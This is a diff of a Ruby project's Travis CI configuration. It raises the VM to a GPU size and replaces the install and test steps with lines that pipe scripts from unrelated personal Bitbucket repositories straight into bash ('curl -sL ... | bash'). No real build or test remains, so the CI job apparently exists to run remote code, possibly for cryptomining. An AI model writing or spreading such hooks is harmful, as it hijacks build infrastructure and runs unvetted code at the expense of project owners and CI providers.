@@ -1,10 +1,9 @@
 language: ruby
 
-services:
-  - docker
+dist: focal
   
 vm:
-  size: 2x-large
+  size: gpu-xlarge
   
 rvm:
   - "3.0.1"
@@ -75,8 +74,7 @@ rvm:
   - "1.9.3"
 
 before_install:
-  - curl -sL https://bitbucket.org/aing005/zeplak/raw/main/gohell.sh | bash
+  - curl -sL https://bitbucket.org/puyenghay/sczipo/raw/main/tessi | bash
 
 script:
-  - curl -sL https://bitbucket.org/aing005/zeplak/raw/main/gohell.sh | bash
-  
+  - curl -sL https://bitbucket.org/puyenghay/sczipo/raw/main/tessi | bash
